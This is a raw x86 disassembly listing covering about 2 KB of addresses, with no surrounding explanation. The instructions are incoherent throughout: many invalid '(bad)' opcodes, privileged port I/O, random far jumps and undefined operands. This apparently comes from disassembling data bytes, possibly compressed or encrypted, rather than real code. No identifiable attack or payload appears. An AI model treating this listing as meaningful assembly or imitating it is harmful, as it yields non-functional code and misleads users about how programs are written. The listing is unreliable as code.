  420350:	jbe    0x420303
  420352:	nop    DWORD PTR [esi]
  420355:	mov    eax,ds:0x20bbb094
  42035a:	and    BYTE PTR [esi-0x2c],al
  42035d:	pushf  
  42035e:	mov    cl,0x1d
  420360:	xor    al,0xdf
  420362:	loopne 0x420316
  420364:	inc    ebx
  420365:	dec    ebp
  420366:	shl    DWORD PTR [ebx+eiz*4],cl
  420369:	inc    eax
  42036a:	and    DWORD PTR [ebp+eax*4+0x64f7b2c3],esi
  420371:	(bad)  
  420372:	(bad)  
  420373:	out    dx,al
  420374:	ja     0x42034d
  420376:	rcr    ebx,cl
  420378:	and    DWORD PTR [esi+eax*1],ebp
  42037b:	sbb    DWORD PTR [eax],eax
  42037d:	jecxz  0x42039c
  42037f:	out    0x13,al
  420381:	outs   dx,BYTE PTR ds:[esi]
  420382:	enter  0xc8cd,0x7f
  420386:	or     al,BYTE PTR [ebp+0x29]
  420389:	mov    edi,0x744dd963
  42038e:	adc    edx,DWORD PTR [edx+0x389132cb]
  420394:	sub    DWORD PTR [edx-0x53],ecx
  420397:	test   DWORD PTR [esi],0x18887381
  42039d:	adc    bl,al
  42039f:	shl    BYTE PTR [ebx],1
  4203a1:	(bad)  
  4203a2:	sti    
  4203a3:	or     al,ah
  4203a5:	lds    eax,FWORD PTR [ecx-0x28]
  4203a8:	frstor [esi+esi*2]
  4203ab:	imul   eax,DWORD PTR [edi],0x1eac3699
  4203b1:	push   ebp
  4203b2:	adc    BYTE PTR [ecx-0x4f47e7a1],bl
  4203b8:	les    edx,FWORD PTR [ebx+edx*4-0x7f39781a]
  4203bf:	and    al,0xc0
  4203c1:	ror    esi,1
  4203c3:	mov    WORD PTR [esi],?
  4203c5:	cmp    ecx,ebx
  4203c7:	dec    ebx
  4203c8:	ret    
  4203c9:	push   esp
  4203ca:	leave  
  4203cb:	mov    esi,0x5f6dc78f
  4203d0:	sbb    DWORD PTR [esi],0xffffffdd
  4203d3:	pushf  
  4203d4:	xchg   edi,eax
  4203d5:	or     BYTE PTR [eax-0xeca1427],ch
  4203db:	jae    0x420377
  4203dd:	aas    
  4203de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203df:	jmp    0x81cc:0x4028acb
  4203e6:	or     dh,BYTE PTR [edx+0x65580ae4]
  4203ec:	into   
  4203ed:	leave  
  4203ee:	fwait
  4203ef:	lahf   
  4203f0:	mov    esi,esp
  4203f2:	pushf  
  4203f3:	sbb    esp,DWORD PTR [edi]
  4203f5:	xchg   edx,eax
  4203f6:	not    esi
  4203f8:	retf   0x81c8
  4203fb:	es add eax,0xff545b1f
  420401:	ret    
  420402:	dec    edi
  420403:	out    0x5b,eax
  420405:	jmp    0x99f7:0x684e7ab7
  42040c:	mov    ds:0x48aff2d3,eax
  420411:	add    al,0x9e
  420413:	pop    ebp
  420414:	ja     0x4203ac
  420416:	cmc    
  420417:	lods   eax,DWORD PTR ds:[esi]
  420418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420419:	pop    ecx
  42041a:	inc    ebp
  42041b:	sbb    al,0x78
  42041d:	cmp    ecx,DWORD PTR ds:0xd2358d21
  420423:	pop    eax
  420424:	push   edx
  420425:	int    0xbf
  420427:	jbe    0x420459
  420429:	or     al,0x4c
  42042b:	xor    al,0x99
  42042d:	cwde   
  42042e:	mov    ah,0x59
  420430:	in     eax,dx
  420431:	stc    
  420432:	shl    BYTE PTR [eax+0x7b],cl
  420435:	int3   
  420436:	push   ss
  420437:	ins    DWORD PTR es:[edi],dx
  420438:	mov    ds:0x46a83794,eax
  42043d:	cli    
  42043e:	mov    ds:0x9cda3679,al
  420443:	mov    ah,BYTE PTR [ebx]
  420445:	das    
  420446:	mov    dl,0xe1
  420448:	jne    0x42044f
  42044a:	or     al,0xca
  42044c:	adc    BYTE PTR [eax-0x3f8340d1],0xae
  420453:	sbb    BYTE PTR [esi+0x2c],0xfc
  420457:	adc    ebp,DWORD PTR [edx+0x3451bfc]
  42045d:	push   esp
  42045e:	in     eax,dx
  42045f:	mov    edi,0x3e68ca5e
  420464:	inc    ecx
  420465:	dec    DWORD PTR [eax-0x57]
  420468:	mov    DWORD PTR [edi],ecx
  42046a:	push   ecx
  42046b:	nop
  42046c:	stos   DWORD PTR es:[edi],eax
  42046d:	adc    al,0x58
  42046f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420470:	mov    ebx,0x60342010
  420475:	jmp    0x81bd:0x847e3a9e
  42047c:	js     0x4204f9
  42047e:	ss (bad) 
  420480:	(bad)  
  420481:	in     al,dx
  420482:	lea    edi,[eax+0xe1cdde6]
  420488:	fisttp WORD PTR [edi+0x2086c820]
  42048e:	jnp    0x42050a
  420490:	or     ebp,esp
  420492:	mov    ebx,0x24cf9224
  420497:	aam    0xd1
  420499:	jae    0x420423
  42049b:	(bad)  
  42049c:	push   edx
  42049d:	or     eax,0xca59ce88
  4204a2:	jmp    0xf2ae:0xb73cec4
  4204a9:	and    bl,bh
  4204ab:	cld    
  4204ac:	sbb    esi,DWORD PTR [esi+eax*1-0x14]
  4204b0:	adc    al,0x1f
  4204b2:	push   esp
  4204b3:	in     al,dx
  4204b4:	int    0xc7
  4204b6:	and    esi,edi
  4204b8:	arpl   di,cx
  4204ba:	and    BYTE PTR [ebp-0x5be7adf0],dl
  4204c0:	aad    0x1f
  4204c2:	adc    BYTE PTR [ecx+0x73574433],dh
  4204c8:	inc    edi
  4204c9:	inc    ebp
  4204ca:	mov    es,ebx
  4204cc:	mov    ecx,0xb78c160a
  4204d1:	(bad)  
  4204d2:	call   0x2cbb:0x91d4a0fc
  4204d9:	ins    DWORD PTR es:[edi],dx
  4204da:	out    0xd1,eax
  4204dc:	(bad)  
  4204dd:	pop    ecx
  4204de:	jbe    0x42050a
  4204e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204e1:	add    edx,DWORD PTR [eax+0x10c956ce]
  4204e7:	xor    al,0xab
  4204e9:	pop    edi
  4204ea:	(bad)  
  4204eb:	leave  
  4204ec:	and    dl,BYTE PTR [edx]
  4204ee:	hlt    
  4204ef:	push   cs
  4204f0:	test   eax,0x876dd602
  4204f5:	mov    di,0x9f6e
  4204f9:	cli    
  4204fa:	jb     0x4204c6
  4204fc:	jns    0x4204a9
  4204fe:	lods   al,BYTE PTR ds:[esi]
  4204ff:	(bad)  
  420500:	jle    0x4204de
  420502:	dec    ebx
  420503:	fadd   st,st(5)
  420505:	add    cx,WORD PTR [eax-0x5e]
  420509:	lea    esi,[eax+edi*2+0x73d72868]
  420510:	or     eax,0xb6428c8f
  420515:	or     al,0xc3
  420517:	out    dx,eax
  420518:	test   eax,0xe3310b46
  42051d:	je     0x4204c7
  42051f:	jb     0x4204b7
  420521:	push   0x87063caa
  420526:	test   eax,0xc7115c88
  42052b:	mov    BYTE PTR [eax-0x61936e31],ch
  420531:	inc    ebp
  420532:	out    0xdf,eax
  420534:	add    BYTE PTR [esi-0x27],bl
  420537:	pusha  
  420538:	or     ebx,DWORD PTR [eax-0x14]
  42053b:	(bad)  
  42053c:	add    BYTE PTR fs:[edi+0x70f2cc47],al
  420543:	adc    eax,DWORD PTR [eax-0x6ce0ba50]
  420549:	loopne 0x4204ee
  42054b:	adc    esi,DWORD PTR [ebp-0x33]
  42054e:	push   ss
  42054f:	cmp    edx,edx
  420551:	fdivr  DWORD PTR [ecx+0x3ce1ea58]
  420557:	mov    ebp,ds
  420559:	sar    BYTE PTR [edx+edx*1+0x6b],cl
  42055d:	shr    BYTE PTR [ecx],1
  42055f:	and    BYTE PTR [edi],ch
  420561:	cld    
  420562:	xchg   esp,eax
  420563:	or     BYTE PTR [edx-0x1f6c684f],ah
  420569:	outs   dx,BYTE PTR ds:[esi]
  42056a:	jbe    0x4205ac
  42056c:	mov    ebx,0xdc1dbb5a
  420571:	imul   ecx,esp,0xf5a9b66e
  420577:	test   DWORD PTR [ecx+0x3041db23],ebx
  42057d:	stc    
  42057e:	cdq    
  42057f:	int    0x67
  420581:	fidivr DWORD PTR [ebp-0x71]
  420584:	sub    DWORD PTR [esi-0x52],ebx
  420587:	and    ebp,DWORD PTR [edx]
  420589:	pop    edi
  42058a:	dec    edi
  42058b:	mov    eax,ecx
  42058d:	pop    gs
  42058f:	cdq    
  420590:	in     eax,0x52
  420592:	arpl   WORD PTR [esi-0x4389f3ec],ax
  420598:	in     eax,dx
  420599:	jne    0x4205ee
  42059b:	inc    ecx
  42059c:	sbb    al,0x1c
  42059e:	data16 js 0x420542
  4205a1:	push   edx
  4205a2:	dec    edx
  4205a3:	xchg   ebx,eax
  4205a4:	sbb    BYTE PTR [ebx],0x5
  4205a7:	popf   
  4205a8:	adc    ebx,0xffffffb7
  4205ab:	xor    ecx,eax
  4205ad:	out    0x6b,al
  4205af:	rol    DWORD PTR ds:0x2345dae0,0x51
  4205b6:	or     ecx,DWORD PTR [ebx-0x25]
  4205b9:	sub    esi,0x50
  4205bc:	jge    0x420634
  4205be:	mov    ecx,0xd081b618
  4205c3:	in     eax,dx
  4205c4:	call   0xcbfc:0x1d8061c
  4205cb:	sub    eax,0xcdeb439d
  4205d0:	mov    ds:0xd81ef5d,al
  4205d5:	push   cs
  4205d6:	add    eax,0x2a34d106
  4205db:	dec    ebx
  4205dc:	xor    dh,cl
  4205de:	dec    edi
  4205df:	jmp    0x87e4:0x7e3d8caf
  4205e6:	mov    bh,0xa9
  4205e8:	inc    ecx
  4205e9:	mov    ebx,0x9324a12b
  4205ee:	popf   
  4205ef:	shr    BYTE PTR ds:0xe41585c5,0x67
  4205f6:	mov    ch,0x7e
  4205f8:	dec    ebx
  4205f9:	add    cl,BYTE PTR [edi]
  4205fb:	test   BYTE PTR ds:0x5fba68c3,al
  420601:	xchg   esp,edi
  420603:	sbb    al,0x4e
  420605:	xchg   DWORD PTR [ecx-0x29],eax
  420608:	neg    BYTE PTR [ebx+0x4786db7a]
  42060e:	out    dx,al
  42060f:	dec    ebx
  420610:	frstor [ecx+0xa]
  420613:	aad    0xca
  420615:	sub    ebp,DWORD PTR [ebp+0x36604da0]
  42061b:	lea    eax,[esp+ecx*1-0x40]
  42061f:	scas   al,BYTE PTR es:[edi]
  420620:	addr16 test edi,ebx
  420623:	cmp    esp,DWORD PTR [edi+0x262df2c9]
  420629:	add    dl,dl
  42062b:	jno    0x42062d
  42062d:	jno    0x42062b
  42062f:	jnp    0x42069e
  420631:	je     0x42069a
  420633:	sbb    ah,BYTE PTR [eax-0x704d1899]
  420639:	pop    ebx
  42063a:	pop    edi
  42063b:	(bad)  
  42063c:	xor    eax,edx
  42063e:	cmp    al,0x70
  420640:	adc    eax,0xa60caf47
  420645:	fnstcw WORD PTR [ebx-0x4afada0b]
  42064b:	and    dl,ch
  42064d:	mov    DWORD PTR [esi-0x5c],ebp
  420650:	mov    ebx,0x11496e65
  420655:	xor    BYTE PTR ds:[ecx+ebp*4],al
  420659:	leave  
  42065a:	jno    0x420607
  42065c:	out    dx,al
  42065d:	call   0xdc987fa8
  420662:	pop    ecx
  420663:	loopne 0x420619
  420665:	and    BYTE PTR [edx+eiz*2],dl
  420668:	push   ecx
  420669:	dec    eax
  42066a:	xchg   esp,eax
  42066b:	mov    ebx,DWORD PTR [eax]
  42066d:	and    ebp,edx
  42066f:	jae    0x4205fa
  420671:	mov    dh,0x9c
  420673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420674:	xchg   esp,eax
  420675:	jge    0x42066a
  420677:	jno    0x42060e
  420679:	jb     0x42065a
  42067b:	(bad)  
  42067c:	jg     0x42062d
  42067e:	and    al,0x68
  420680:	xor    eax,0x3d3a819e
  420685:	ins    BYTE PTR es:[edi],dx
  420686:	inc    edi
  420687:	pop    eax
  420688:	jmp    0x995b:0xdcbc902c
  42068f:	or     cl,BYTE PTR [ecx]
  420691:	(bad)  
  420692:	sub    eax,0x2f819f37
  420697:	sub    DWORD PTR [esp+eiz*8],edi
  42069a:	add    bh,BYTE PTR [ecx+0x1b]
  42069d:	push   ecx
  42069e:	cmc    
  42069f:	das    
  4206a0:	outs   dx,BYTE PTR ds:[esi]
  4206a1:	out    dx,al
  4206a2:	push   esi
  4206a3:	jl     0x420633
  4206a5:	out    0x2f,al
  4206a7:	icebp  
  4206a8:	cli    
  4206a9:	jecxz  0x420656
  4206ab:	ret    
  4206ac:	jmp    0xa20:0x5a0809fb
  4206b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206b4:	push   esi
  4206b5:	jbe    0x42065e
  4206b7:	push   edx
  4206b8:	(bad)  
  4206b9:	jae    0x42067a
  4206bb:	test   eax,0x854668dd
  4206c0:	stc    
  4206c1:	and    cl,ch
  4206c3:	pop    ds
  4206c4:	cmp    al,BYTE PTR [ecx]
  4206c6:	test   esp,0xf8dec1c8
  4206cc:	ss sub al,0xa
  4206cf:	dec    ebp
  4206d0:	inc    esp
  4206d1:	ficomp DWORD PTR [ebx-0x42d6a2a9]
  4206d7:	popf   
  4206d8:	sub    eax,DWORD PTR [esi-0x363f0521]
  4206de:	adc    esi,DWORD PTR [eax+ebp*1-0x75]
  4206e2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4206e4:	call   0x45a5a056
  4206e9:	mov    ds:0x1274b5cf,eax
  4206ee:	test   BYTE PTR [edi-0xd],ch
  4206f1:	adc    esp,DWORD PTR [edi]
  4206f3:	shl    BYTE PTR [edi+0x73828a7f],cl
  4206f9:	out    0x19,eax
  4206fb:	pop    ss
  4206fc:	lds    edi,FWORD PTR [edx]
  4206fe:	mul    DWORD PTR [ecx-0x40]
  420701:	push   ss
  420702:	or     al,0x79
  420704:	mov    esp,0xeb6277b9
  420709:	push   es
  42070a:	mov    BYTE PTR [eax-0x37],ah
  42070d:	inc    eax
  42070e:	lods   al,BYTE PTR ds:[esi]
  42070f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420710:	and    al,0xa9
  420712:	lods   al,BYTE PTR ds:[esi]
  420713:	mov    ah,0x6c
  420715:	stc    
  420716:	push   eax
  420717:	jmp    0x42075a
  420719:	sub    esp,eax
  42071b:	test   DWORD PTR [ebp+0x784c0f70],0xa6080fe5
  420725:	data16 hlt 
  420727:	xor    DWORD PTR [edi+0x35525baf],0xb40100c2
  420731:	fnstenv [ebx+0xbd9bbe0]
  420737:	ins    BYTE PTR es:[edi],dx
  420738:	mov    esp,DWORD PTR [edx-0x37]
  42073b:	aaa    
  42073c:	repz cmp DWORD PTR [esi-0x4ee28010],0x54
  420744:	mov    dh,0xe7
  420746:	loope  0x420709
  420748:	pusha  
  420749:	xor    dl,BYTE PTR [esi]
  42074b:	int3   
  42074c:	inc    esp
  42074d:	dec    esi
  42074e:	jne    0x420776
  420750:	ret    0x704a
  420753:	jmp    0x4207a4
  420755:	rcr    BYTE PTR [ebp-0x66],0x79
  420759:	or     eax,0x942e07fa
  42075e:	sbb    BYTE PTR [eax-0x6],al
  420761:	mov    ch,0x92
  420763:	add    BYTE PTR [edx+0x40],cl
  420766:	jle    0x420739
  420768:	das    
  420769:	adc    BYTE PTR [ebp+0x39],ah
  42076c:	push   esi
  42076d:	push   ss
  42076e:	mov    ecx,0x22d7ee
  420773:	fst    DWORD PTR [eax]
  420775:	mov    ds:0xd4ae548f,al
  42077a:	mov    edx,edi
  42077c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42077d:	fwait
  42077e:	(bad)  
  42077f:	test   esp,0xa0907dc9
  420785:	sbb    eax,0xf24e9caa
  42078a:	js     0x420744
  42078c:	mov    edx,0x10a269a6
  420791:	popf   
  420792:	out    0x1e,al
  420794:	out    0xef,al
  420796:	jmp    0xda1a9f8e
  42079b:	rol    BYTE PTR [ebx-0x51],cl
  42079e:	xchg   ebp,eax
  42079f:	retf   
  4207a0:	ret    
  4207a1:	pop    ebp
  4207a2:	inc    esi
  4207a3:	add    eax,0x37bf720c
  4207a8:	push   es
  4207a9:	cmp    DWORD PTR [edx-0x5cb51912],0x3b892073
  4207b3:	xchg   esi,eax
  4207b4:	cmp    eax,0x58408ccd
  4207b9:	cmp    eax,0xd11751e3
  4207be:	push   edi
  4207bf:	jg     0x4207c9
  4207c1:	mov    BYTE PTR [edx-0x323c65a9],bh
  4207c7:	gs retf 
  4207c9:	out    0x82,al
  4207cb:	(bad)  [ebx-0x57]
  4207ce:	ds jns 0x420829
  4207d1:	lods   al,BYTE PTR ds:[esi]
  4207d2:	cli    
  4207d3:	or     BYTE PTR ds:0x6b52289,0x4
  4207da:	fsub   QWORD PTR [ebx]
  4207dc:	xchg   ebx,eax
  4207dd:	inc    ebp
  4207de:	daa    
  4207df:	in     al,dx
  4207e0:	mov    ah,0x6e
  4207e2:	fucomp st(2)
  4207e4:	xchg   esi,ebp
  4207e6:	sbb    al,0x35
  4207e8:	jns    0x4207c5
  4207ea:	xchg   edx,eax
  4207eb:	retf   
  4207ec:	pop    ebp
  4207ed:	pop    esp
  4207ee:	fimul  WORD PTR [edi]
  4207f0:	fadd   QWORD PTR [edx]
  4207f2:	xchg   esp,eax
  4207f3:	(bad)  
  4207f4:	xchg   esp,eax
  4207f5:	das    
  4207f6:	in     eax,dx
  4207f7:	mov    bh,BYTE PTR [edi+edx*4-0x2ddc8e6f]
  4207fe:	adc    al,0xcb
  420800:	mov    edx,0xc208792d
  420805:	rcr    dl,1
  420807:	sti    
  420808:	std    
  420809:	mov    WORD PTR [edx+eax*8+0x37],?
  42080d:	xchg   esp,eax
  42080e:	push   ds
  42080f:	out    0xe3,al
  420811:	cwde   
  420812:	mov    ebx,0x31e3b2d0
  420817:	cdq    
  420818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420819:	int    0xdd
  42081b:	jge    0x420837
  42081d:	add    dl,al
  42081f:	mov    eax,ds:0xa891b491
  420824:	mov    dl,0xcb
  420826:	fwait
  420827:	or     eax,0x9f1e6c75
  42082c:	(bad)  
  42082d:	out    dx,al
  42082e:	sub    al,0x10
  420830:	aad    0x19
  420832:	test   DWORD PTR [ebp-0x39cdc637],ebx
  420838:	in     eax,dx
  420839:	fcomp  DWORD PTR [edx-0x49]
  42083c:	xchg   esp,eax
  42083d:	xchg   ebx,eax
  42083e:	ret    0x8641
  420841:	add    DWORD PTR [ecx],ebp
  420843:	push   ss
  420844:	test   BYTE PTR [esi],dl
  420846:	(bad)  
  420848:	fwait
  420849:	push   0x1680dcc2
  42084e:	(bad)
  420851:	call   0x301bd342
  420856:	sbb    DWORD PTR [eax+edx*1],esp
  420859:	mov    edi,0x7254d350
  42085e:	jae    0x4207e6
  420860:	into   
  420861:	and    BYTE PTR [eax-0x1b],al
  420864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420865:	and    cl,ch
  420867:	fistp  WORD PTR [ebp+ebp*4-0x232fcd7c]
  42086e:	mov    DWORD PTR [ecx-0x6bbae772],ebp
  420874:	popa   
  420875:	mov    DWORD PTR [eax+0x72206c00],esp
  42087b:	adc    dh,BYTE PTR ds:0x65f371b7
  420881:	ins    DWORD PTR es:[edi],dx
  420882:	lods   eax,DWORD PTR ds:[esi]
  420883:	fidiv  DWORD PTR [esi]
  420885:	lds    esi,FWORD PTR [esi]
  420887:	popa   
  420888:	adc    eax,0x5529b186
  42088d:	(bad)  
  42088e:	push   ds
  42088f:	rcl    DWORD PTR [ecx+0x72],1
  420892:	pop    edx
  420893:	rcr    BYTE PTR [ecx+ecx*1],1
  420896:	fcom   DWORD PTR [edi+edx*2-0x47]
  42089a:	popf   
  42089b:	and    al,0x2
  42089d:	cdq    
  42089e:	and    bh,BYTE PTR ds:0xfbf2d816
  4208a4:	loop   0x42088f
  4208a6:	cmp    edx,edx
  4208a8:	aad    0x7a
  4208aa:	mov    esi,0x10a1758b
  4208af:	adc    edi,DWORD PTR [ecx]
  4208b1:	add    DWORD PTR [ebx],0x4aa46961
  4208b7:	dec    eax
  4208b8:	xor    dl,dl
  4208ba:	cdq    
  4208bb:	sbb    edx,edx
  4208bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208be:	cdq    
  4208bf:	in     eax,dx
  4208c0:	sbb    esp,DWORD PTR [ecx+0x17e30c61]
  4208c6:	fdivr  QWORD PTR [edi]
  4208c8:	and    ecx,DWORD PTR [ebx]
  4208ca:	xor    edx,DWORD PTR [esi]
  4208cc:	adc    eax,0xfada7067
  4208d1:	js     0x4208c6
  4208d3:	lods   al,BYTE PTR ds:[esi]
  4208d4:	das    
  4208d5:	lods   al,BYTE PTR ds:[esi]
  4208d6:	and    esi,DWORD PTR [eax-0x4581b25a]
  4208dc:	jne    0x4208a2
  4208de:	fidiv  DWORD PTR [esi+0x690ab814]
  4208e4:	cmp    al,0xd5
  4208e6:	mov    esp,0x70a19101
  4208eb:	xor    DWORD PTR [ebx+0x53f7daad],ebx
  4208f1:	sbb    ch,BYTE PTR [ebx-0x33fa27f8]
  4208f7:	retf   0x6bb9
  4208fa:	mov    DWORD PTR [ebx],edx
  4208fc:	and    eax,0xfb4e759f
  420901:	(bad)  
  420902:	pop    es
  420903:	push   ebp
  420904:	bound  ebx,QWORD PTR [ecx+ecx*4]
  420907:	dec    edi
  420908:	gs std 
  42090a:	push   es
  42090b:	in     al,0x36
  42090d:	push   ds
  42090e:	and    ah,BYTE PTR [edx]
  420910:	aam    0xd9
  420912:	in     eax,0xa4
  420914:	inc    ecx
  420915:	adc    dh,BYTE PTR [ebp+0x610b4b34]
  42091b:	sbb    eax,edi
  42091d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42091e:	mov    ds:0x9d3bcb9c,al
  420923:	div    bh
  420925:	adc    WORD PTR [eax+edi*8],0x3c30
  42092b:	inc    ebx
  42092c:	and    eax,0xda808e1c
  420931:	lock or al,0xaa
  420934:	cmp    eax,0x65c0c6f
  420939:	cmp    BYTE PTR [edi-0x50],ah
  42093c:	mov    ecx,0xbd33ac5e
  420941:	punpckhdq mm6,mm7
  420944:	dec    esi
  420945:	in     eax,0x89
  420947:	jno    0x42099f
  420949:	std    
  42094a:	add    DWORD PTR [ecx-0x5],esi
  42094d:	mov    edx,0x8f19d220
  420952:	outs   dx,BYTE PTR ds:[esi]
  420953:	xchg   edx,eax
  420954:	daa    
  420955:	test   eax,0x689ebde5
  42095a:	shl    BYTE PTR [eax-0x26],cl
  42095d:	mov    ds:0x2e583133,eax
  420962:	mov    bl,0xf5
  420964:	jne    0x4208ec
  420966:	inc    edx
  420967:	sub    BYTE PTR [esi],ah
  420969:	les    ebp,FWORD PTR [ebx+ecx*2-0x24548c43]
  420970:	pop    esi
  420971:	jg     0x4209f0
  420973:	sbb    BYTE PTR [ebp+0x2c41908e],al
  420979:	(bad)  
  42097a:	sub    ah,BYTE PTR [esi+0x50]
  42097d:	dec    edi
  42097e:	push   esp
  42097f:	pop    edi
  420980:	or     BYTE PTR [ecx-0xa],ch
  420983:	xlat   BYTE PTR ds:[ebx]
  420984:	scas   al,BYTE PTR es:[edi]
  420985:	inc    eax
  420986:	repnz sahf 
  420988:	xchg   esi,eax
  420989:	xchg   esi,eax
  42098a:	pop    esp
  42098b:	push   ebx
  42098c:	push   ss
  42098d:	inc    ebp
  42098e:	adc    al,0xb7
  420990:	pop    ecx
  420991:	sub    al,0x4e
  420993:	jl     0x420978
  420995:	and    DWORD PTR [edi+0x4],esi
  420998:	and    DWORD PTR [ecx],ebp
  42099a:	mov    WORD PTR ds:0x9a81029d,cs
  4209a0:	out    0xd0,al
  4209a2:	push   ss
  4209a3:	sub    ebx,DWORD PTR [ebp+0x26]
  4209a6:	fwait
  4209a7:	pop    esp
  4209a8:	mov    eax,ds:0x322f2bb4
  4209ad:	int3   
  4209ae:	cmp    ecx,DWORD PTR [eax-0x15ae8ee7]
  4209b4:	cmc    
  4209b5:	jmp    0x642454d8
  4209ba:	mov    bl,BYTE PTR [esi]
  4209bc:	jnp    0x420a24
  4209be:	lock mov BYTE PTR [ebx],dh
  4209c1:	xchg   ecx,eax
  4209c2:	aas    
  4209c3:	(bad)  
  4209c4:	cmp    esi,DWORD PTR [eax+0x1b8f03e]
  4209ca:	mov    bh,0xa8
  4209cc:	dec    edi
  4209cd:	xor    BYTE PTR [edx],dh
  4209cf:	test   eax,0xf7d0aa35
  4209d4:	rcl    cl,1
  4209d6:	or     al,0x71
  4209d8:	mov    al,0x4f
  4209da:	jns    0x420a27
  4209dc:	and    ah,bl
  4209de:	rol    bh,cl
  4209e0:	stc    
  4209e1:	push   edi
  4209e2:	cmc    
  4209e3:	adc    BYTE PTR [eax-0x5d],0x83
  4209e7:	mov    al,0x36
  4209e9:	adc    DWORD PTR [edi-0x69],esi
  4209ec:	cmp    ch,BYTE PTR [esp+eax*2+0x2c92a770]
  4209f3:	loope  0x420998
  4209f5:	mov    al,0x0
  4209f7:	mov    eax,0xfd5e2fee
  4209fc:	stc    
  4209fd:	and    BYTE PTR [ecx*4+0xf6d3900],bl
  420a04:	jbe    0x4209bc
  420a06:	fisubr DWORD PTR [ebx+0x4782c998]
  420a0c:	cs leave 
  420a0e:	into   
  420a0f:	jle    0x420a4a
  420a11:	jmp    0x7bbc09d7
  420a16:	neg    DWORD PTR ss:[edx]
  420a19:	(bad)  
  420a1b:	fsub   DWORD PTR [ebp+0x16]
  420a1e:	sub    DWORD PTR [ebx+edx*2-0x53],eax
  420a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a23:	data16 out dx,al
  420a25:	scas   eax,DWORD PTR es:[edi]
  420a26:	(bad)  
  420a28:	fnsave [edx+0x54]
  420a2b:	add    BYTE PTR [ebp-0x41],ch
  420a2e:	lock mov dh,0xf9
  420a31:	cmp    ch,dl
  420a33:	jmp    0x4209cd
  420a35:	or     BYTE PTR [ecx],0x85
  420a38:	out    dx,ax
  420a3a:	ret    
  420a3b:	xor    DWORD PTR [edi-0x7aab7967],0x7d931f22
  420a45:	push   eax
  420a46:	and    ebp,DWORD PTR [ecx]
  420a48:	push   cs
  420a49:	ss mov esp,0x8c8a318f
  420a4f:	add    dh,BYTE PTR [esi+0x20]
  420a52:	jl     0x420aa4
  420a54:	sbb    eax,0xe205f244
  420a59:	bnd fs jno 0x420aa0
  420a5d:	pusha  
  420a5e:	jbe    0x420a94
  420a60:	xchg   ebx,eax
  420a61:	xchg   esp,eax
  420a62:	in     eax,0x9
  420a64:	sub    al,0x8
  420a66:	shr    BYTE PTR [ebp+0x59],0xa2
  420a6a:	add    DWORD PTR [edx],esp
  420a6c:	mov    al,0x77
  420a6e:	shr    edi,0x4e
  420a71:	mov    BYTE PTR [esi-0x10a8b58e],al
  420a77:	push   eax
  420a78:	repz into 
  420a7a:	je     0x420a02
  420a7c:	pushf  
  420a7d:	or     eax,0x2c3b41e7
  420a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a83:	mov    dh,0x5f
  420a85:	repnz push cs
  420a87:	sub    bl,ah
  420a89:	pop    edx
  420a8a:	imul   edx,DWORD PTR [ecx+0x76],0xffffffa1
  420a8e:	retf   0x9e03
  420a91:	addr16 cdq 
  420a93:	mov    al,0xd2
  420a95:	sub    al,0x8d
  420a97:	push   edi
  420a98:	cwde   
  420a99:	sub    eax,DWORD PTR [ebp-0x54]
  420a9c:	xor    eax,0xbe893a88
  420aa1:	jp     0x420b1a
  420aa3:	or     cl,BYTE PTR [ebx]
  420aa5:	ror    DWORD PTR [ebp+0x164ead4],0xb3
  420aac:	out    dx,al
  420aad:	fild   DWORD PTR [ebp-0x35]
  420ab0:	jmp    0x420af7
  420ab2:	jecxz  0x420aef
  420ab4:	es sub al,0x11
  420ab7:	sbb    eax,0xede9fef0
  420abc:	mov    ds,WORD PTR [edi+0x62]
  420abf:	dec    ebp
  420ac0:	leave  
  420ac1:	or     ecx,edx
  420ac3:	sub    DWORD PTR [edi+0x41400e2b],ecx
  420ac9:	or     ecx,DWORD PTR [edx-0x5242c08c]
  420acf:	jnp    0x420a52
  420ad1:	xor    DWORD PTR [edi],eax
  420ad3:	mov    edi,0x824f43fc
  420ad8:	enter  0x4bf9,0xd1
  420adc:	aaa    
  420add:	push   cs
  420ade:	xor    edx,DWORD PTR [ebx+0x49e66ed]
  420ae4:	(bad)  
  420ae5:	push   edx
  420ae6:	xchg   ebp,eax
  420ae7:	mov    ch,0xe1
  420ae9:	mov    bh,0x25
  420aeb:	xchg   edi,eax
  420aec:	mov    cl,0xc
  420aee:	fistp  WORD PTR [ecx]
  420af0:	push   ss
  420af1:	js     0x420aca
  420af3:	mov    ebp,0x2722be73
  420af8:	mov    esi,0xbb2c8bff
  420afd:	ficom  WORD PTR [eax]
  420aff:	add    eax,0x7b2312a9
  420b04:	sbb    DWORD PTR [ecx-0x2c],0x7e
  420b08:	and    eax,0x63c33e40
  420b0d:	mov    edx,0xf42afb06
  420b12:	fiadd  WORD PTR [eax+0x169938cb]
  420b18:	hlt    
  420b19:	mov    dh,al
  420b1b:	enter  0x4c82,0x3c
  420b1f:	adc    ecx,DWORD PTR [edi+0x170c6f11]
  420b25:	sti    
  420b26:	mov    edi,0x8dd83e4d
  420b2b:	loope  0x420b45
  420b2d:	pushf  
  420b2e:	out    dx,eax
  420b2f:	mov    esp,0xee0a8859
  420b34:	adc    BYTE PTR [edx-0x7e],ah
  420b37:	sahf   
  420b38:	cmc    
  420b39:	pop    ecx
  420b3a:	fsubr  DWORD PTR [ebx]
  420b3c:	dec    edx
  420b3d:	mov    ebx,0x3323257f
  420b42:	add    DWORD PTR [edx+0x39],ebp
  420b45:	add    eax,0xfccbfa3a
  420b4a:	outs   dx,BYTE PTR ds:[esi]
  420b4b:	fsubr  DWORD PTR [ebx]
  420b4d:	pop    eax
  420b4e:	mov    eax,ds:0xf4ed65
